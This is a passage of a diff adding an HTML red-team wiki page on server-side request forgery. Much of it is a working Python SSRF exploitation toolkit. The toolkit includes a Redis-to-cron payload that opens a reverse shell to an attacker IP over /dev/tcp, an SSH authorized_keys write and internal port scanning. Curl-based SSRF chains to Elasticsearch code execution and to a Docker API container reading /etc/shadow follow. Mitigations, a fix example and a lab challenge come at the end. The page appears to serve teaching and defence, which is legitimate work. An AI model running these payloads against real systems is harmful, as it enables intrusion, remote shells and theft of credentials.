+                url = target_url + f&#34;?{param_name}={urllib.parse.quote(bypass_url)}&#34;
+                r = requests.get(url, timeout=5, allow_redirects=False)
+            else:
+                r = requests.post(target_url, data={param_name: bypass_url}, timeout=5)
+            results.append({
+                &#39;url&#39;: bypass_url,
+                &#39;status&#39;: r.status_code,
+                &#39;length&#39;: len(r.content),
+                &#39;time&#39;: r.elapsed.total_seconds()
+            })
+            print(f&#34;  [{r.status_code}] {bypass_url} ({len(r.content)} bytes, {r.elapsed.total_seconds():.2f}s)&#34;)
+        except requests.exceptions.Timeout:
+            print(f&#34;  [TIMEOUT] {bypass_url}&#34;)
+        except Exception as e:
+            print(f&#34;  [ERROR] {bypass_url}: {e}&#34;)
+    return results
+
+def gopher_payload(host, port, data):
+    &#34;&#34;&#34;Build a gopher URL for raw TCP communication.&#34;&#34;&#34;
+    # URL-encode the data, preserving newlines as %0d%0a
+    encoded = urllib.parse.quote(data, safe=&#39;&#39;)
+    # Gopher format: gopher://host:port/_&lt;url-encoded-data&gt;
+    return f&#34;gopher://{host}:{port}/_{encoded}&#34;
+
+def redis_to_cron(attacker_ip, attacker_port):
+    &#34;&#34;&#34;Generate gopher URL to write a cron job via Redis.&#34;&#34;&#34;
+    cron_cmd = f&#34;* * * * * root bash -c &#39;bash -i &gt;&amp; /dev/tcp/{attacker_ip}/{attacker_port} 0&gt;&amp;1&#39;&#34;
+    redis_payload = &#34;\r\n&#34;.join([
+        &#34;FLUSHALL&#34;,
+        f&#39;SET cron &#34;\n\n{cron_cmd}\n\n&#34;&#39;,
+        &#34;CONFIG SET dir /etc/cron.d&#34;,
+        &#34;CONFIG SET dbfilename redis_shell&#34;,
+        &#34;SAVE&#34;,
+        &#34;QUIT&#34;
+    ])
+    return gopher_payload(&#34;127.0.0.1&#34;, 6379, redis_payload)
+
+def redis_to_authorized_keys(ssh_pubkey):
+    &#34;&#34;&#34;Generate gopher URL to write SSH authorized_keys via Redis.&#34;&#34;&#34;
+    redis_payload = &#34;\r\n&#34;.join([
+        &#34;FLUSHALL&#34;,
+        f&#39;SET sshkey &#34;\n\n{ssh_pubkey}\n\n&#34;&#39;,
+        &#34;CONFIG SET dir /root/.ssh&#34;,
+        &#34;CONFIG SET dbfilename authorized_keys&#34;,
+        &#34;SAVE&#34;,
+        &#34;QUIT&#34;
+    ])
+    return gopher_payload(&#34;127.0.0.1&#34;, 6379, redis_payload)
+
+def portscan_via_ssrf(target_url, param_name, subnet=&#34;127.0.0.1&#34;):
+    &#34;&#34;&#34;Scan internal ports via dict:// SSRF.&#34;&#34;&#34;
+    ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 2375, 10250]
+    open_ports = []
+    for port in ports:
+        start = time.time()
+        try:
+            url = target_url + f&#34;?{param_name}={urllib.parse.quote(f&#39;dict://{subnet}:{port}&#39;)}&#34;
+            r = requests.get(url, timeout=3)
+            elapsed = time.time() - start
+            if r.status_code != 500 and elapsed &lt; 2.5:
+                open_ports.append(port)
+                print(f&#34;  Port {port}: OPEN ({elapsed:.2f}s)&#34;)
+        except:
+            pass
+    return open_ports
+
+def main():
+    parser = argparse.ArgumentParser(description=&#39;SSRF Exploitation Toolkit&#39;)
+    parser.add_argument(&#39;target&#39;, help=&#39;Target SSRF URL (e.g., http://target/page?url=)&#39;)
+    parser.add_argument(&#39;-p&#39;, &#39;--parameter&#39;, default=&#39;url&#39;, help=&#39;Parameter name to inject (default: url)&#39;)
+    parser.add_argument(&#39;-m&#39;, &#39;--method&#39;, default=&#39;GET&#39;, choices=[&#39;GET&#39;, &#39;POST&#39;])
+    parser.add_argument(&#39;--scan&#39;, action=&#39;store_true&#39;, help=&#39;Scan internal ports via dict:// SSRF&#39;)
+    parser.add_argument(&#39;--bypass&#39;, action=&#39;store_true&#39;, help=&#39;Test localhost bypass techniques&#39;)
+    parser.add_argument(&#39;--metadata&#39;, action=&#39;store_true&#39;, help=&#39;Test cloud metadata endpoints&#39;)
+    parser.add_argument(&#39;--redis-cron&#39;, metavar=&#39;ATTACKER_IP:PORT&#39;, help=&#39;Generate Redis→Cron payload&#39;)
+    args = parser.parse_args()
+
+    if args.scan:
+        print(&#34;[*] Port scanning internal services via dict://&#34;)
+        open_ports = portscan_via_ssrf(args.target, args.parameter)
+        print(f&#34;[+] Open ports: {open_ports}&#34;)
+
+    if args.bypass:
+        print(&#34;[*] Testing localhost bypass techniques&#34;)
+        test_parameter_ssrf(args.target, args.parameter, build_localhost_bypasses(), args.method)
+
+    if args.metadata:
+        print(&#34;[*] Testing cloud metadata endpoints&#34;)
+        meta_urls = build_metadata_urls()
+        for cloud, urls in meta_urls.items():
+            print(f&#34;\n  --- {cloud.upper()} ---&#34;)
+            test_parameter_ssrf(args.target, args.parameter, urls, args.method)
+
+    if args.redis_cron:
+        host_port = args.redis_cron.split(&#39;:&#39;)
+        attacker_ip = host_port[0]
+        attacker_port = host_port[1] if len(host_port) &gt; 1 else &#39;4444&#39;
+        gopher = redis_to_cron(attacker_ip, attacker_port)
+        print(&#34;[*] Redis → Cron job Gopher URL:&#34;)
+        print(gopher)
+        print(&#34;\n[*] Send this as the SSRF parameter value&#34;)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+						</pre>
+					</section>
+					<section>
+						<h3 id="blind-ssrf">Blind SSRF</h3>
+						<p>When the server doesn't return the fetched content, you need side channels:</p>
+						<p>
+							<b>Out-of-band callbacks:</b>
+							Use Burp Collaborator or
+							<code>interactsh</code>
+							to receive
+							<abbr title="Domain Name System">DNS</abbr>
+							/
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							callbacks:
+						</p>
+						<pre class="bash">
+# interactsh
+interactsh-client -json -o interactsh.json
+# Start callback server, get a unique domain like c12345.interact.sh
+
+# Send that domain as the SSRF target
+curl &#34;http://target/ssrf?url=http://c12345.interact.sh/&#34;
+# If you get a DNS or HTTP callback, SSRF is confirmed
+						</pre>
+						<p>
+							<b>Time-based detection:</b>
+							Port open -> quick error. Port closed -> connection timeout.
+						</p>
+						<pre class="bash">
+time curl -s &#34;http://target/ssrf?url=http://127.0.0.1:22/&#34;  # Fast: port 22 open
+time curl -s &#34;http://target/ssrf?url=http://127.0.0.1:8765/&#34; # Slow: port closed
+						</pre>
+						<p>
+							<b>Error differentiation:</b>
+							Different ports produce different errors:
+						</p>
+						<pre class="bash">
+curl &#34;http://target/ssrf?url=http://127.0.0.1:8080/&#34;  # &#34;admin panel response...&#34;
+curl &#34;http://target/ssrf?url=http://127.0.0.1:9200/&#34;  # &#34;{\&#34;name\&#34;:\&#34;elasticsearch\&#34;...}&#34;
+curl &#34;http://target/ssrf?url=http://127.0.0.1:6379/&#34;  # &#34;ERR unknown command &#39;GET&#39;&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="ssrf-rce-chains">SSRF -> RCE Chains</h3>
+						<h4 id="ssrf-redis-system-command">SSRF -> Redis -> System Command</h4>
+						<pre class="plaintext">
+SSRF (gopher://) → Redis → CONFIG SET dir /etc/cron.d → SAVE → cron executes every minute
+						</pre>
+						<h4 id="ssrf-elasticsearch-rce">SSRF -> Elasticsearch RCE</h4>
+						<pre class="plaintext">
+http://target/ssrf?url=http://localhost:9200/_search?source={&#34;script_fields&#34;:{&#34;test&#34;:{&#34;script&#34;:&#34;java.lang.Math.class.forName(\&#34;java.lang.Runtime\&#34;).getRuntime().exec(\&#34;id\&#34;)&#34;}}}
+						</pre>
+						<h4 id="ssrf-docker-api-host-root">SSRF -> Docker API -> Host Root</h4>
+						<pre class="bash">
+# Podman socket is at /run/podman/podman.sock; Docker socket at /var/run/docker.sock
+# But Docker API on TCP (2375) can be hit via SSRF
+
+# Create privileged container mounting host root filesystem
+curl &#34;http://target/ssrf?url=http://localhost:2375/containers/create&#34;
+POST to create with {&#34;Image&#34;:&#34;alpine&#34;,&#34;Cmd&#34;:[&#34;/bin/sh&#34;,&#34;-c&#34;,&#34;chroot /hostfs cat /hostfs/etc/shadow&#34;],&#34;HostConfig&#34;:{&#34;Binds&#34;:[&#34;/:/hostfs:rw&#34;],&#34;Privileged&#34;:true}}
+						</pre>
+					</section>
+					<section>
+						<h3 id="fixes">Fixes</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Mitigation</th>
+									<th align="center">Effectiveness</th>
+									<th align="center">Notes</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Allowlist domains</td>
+									<td align="center">Best</td>
+									<td align="center">Only permit known-safe domains. Hardcode them.</td>
+								</tr>
+								<tr>
+									<td align="center">Disallow all internal IPs</td>
+									<td align="center">Strong</td>
+									<td align="center">Block RFC 1918 (10/8, 172.16/12, 192.168/16), loopback (127/8), link-local (169.254/16),<code>0.0.0.0</code>,<code>::1</code></td>
+								</tr>
+								<tr>
+									<td align="center">Validate DNS first, then connect</td>
+									<td align="center">Good</td>
+									<td align="center">Resolve the hostname, validate the IP, then make the request (beware DNS rebinding with very short TTL)</td>
+								</tr>
+								<tr>
+									<td align="center">Disable URL schemes</td>
+									<td align="center">Strong</td>
+									<td align="center">Only allow<code>http://</code>and<code>https://</code>. Block<code>file://</code>,<code>gopher://</code>,<code>dict://</code>,<code>ftp://</code>.</td>
+								</tr>
+								<tr>
+									<td align="center">Use network egress proxy</td>
+									<td align="center">Strong</td>
+									<td align="center">Route all outbound requests through a proxy that enforces allowlists</td>
+								</tr>
+								<tr>
+									<td align="center">Disable redirect following</td>
+									<td align="center">Supplemental</td>
+									<td align="center">Prevents open-redirect-to-SSRF chains. Set redirect limit to 0.</td>
+								</tr>
+								<tr>
+									<td align="center">Network segmentation</td>
+									<td align="center">Architectural</td>
+									<td align="center">Don't run web servers on the same box as databases. Put metadata in a separate namespace (IMDSv2).</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="python-fix-example-requests">Python fix example (requests)</h4>
+						<pre class="python">
+import socket
+import ipaddress
+import requests
+from urllib.parse import urlparse
+
+ALLOWED_DOMAINS = {&#39;api.trusted.com&#39;, &#39;cdn.example.com&#39;}
+BLOCKED_NETWORKS = [
+    ipaddress.ip_network(&#39;10.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;172.16.0.0/12&#39;),
+    ipaddress.ip_network(&#39;192.168.0.0/16&#39;),
+    ipaddress.ip_network(&#39;127.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;169.254.0.0/16&#39;),
+    ipaddress.ip_network(&#39;0.0.0.0/8&#39;),
+]
+
+def safe_request(url):
+    parsed = urlparse(url)
+    if parsed.scheme not in (&#39;http&#39;, &#39;https&#39;):
+        raise ValueError(f&#34;Scheme {parsed.scheme} not allowed&#34;)
+    if parsed.hostname not in ALLOWED_DOMAINS:
+        raise ValueError(f&#34;Domain {parsed.hostname} not in allowlist&#34;)
+    ip = socket.gethostbyname(parsed.hostname)
+    for net in BLOCKED_NETWORKS:
+        if ipaddress.ip_address(ip) in net:
+            raise ValueError(f&#34;IP {ip} is in blocked range {net}&#34;)
+    return requests.get(url, allow_redirects=False, timeout=5)
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Exploit the lab container. It runs a Flask app with several
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							endpoints, an internal Redis instance, and a simulated metadata service. Work through the unfiltered
+							endpoint, then the
+							<code>localhost</code>
+							and
+							<abbr title="Internet Protocol">IP</abbr>
+							blacklist variants, and finally turn
+							the Redis
+							<code>gopher://</code>
+							primitive into a file write.
+						</p>
+						<p><a href="/wiki/articles/redteam/ssrf.Containerfile">ssrf.Containerfile</a></p>
+						<pre class="bash">
+podman build -t ssrf -f ssrf.Containerfile .
+podman run -d -p 5000:5000 ssrf
+
+# Fetch the internal-only admin panel through the unfiltered endpoint:
+curl &#39;http://localhost:5000/fetch?url=http://127.0.0.1:5000/admin&#39;
+
+# Bypass the &#34;localhost&#34; blacklist with a decimal or IPv6 form:
+curl &#39;http://localhost:5000/fetch-safe?url=http://2130706433:5000/admin&#39;
+curl &#39;http://localhost:5000/fetch-safe?url=http://[::1]:5000/admin&#39;
+
+# Reach the simulated metadata service:
+curl &#39;http://localhost:5000/fetch?url=http://localhost:5000/meta/latest/meta-data/&#39;
+
+# Endpoints:
+#   GET /fetch?url=...             no filter
+#   GET /fetch-safe?url=...        blocks the string &#34;localhost&#34;
+#   GET /fetch-noip?url=...        blocks 127.0.0.1
+#   GET /fetch-blind?url=...       no response body
+#   GET /admin                     only reachable from localhost
+#   GET /meta/latest/meta-data/    simulated cloud metadata
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://portswigger.net/web-security/ssrf" target="_blank">PortSwigger - Server-Side Request Forgery</a></li>
+							<li><a class="icon-website" href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP - SSRF Prevention Cheat Sheet</a></li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/918.html" target="_blank">CWE-918: Server-Side Request Forgery</a></li>
+							<li><a class="icon-website" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank">AWS - Instance Metadata Service</a></li>
+							<li><a class="icon-website" href="https://cloud.google.com/compute/docs/metadata/overview" target="_blank">Google Cloud - Metadata Service</a></li>
+							<li><a class="icon-github" href="https://github.com/tarunkant/Gopherus" target="_blank">Gopherus - SSRF to RCE Payload Generator</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
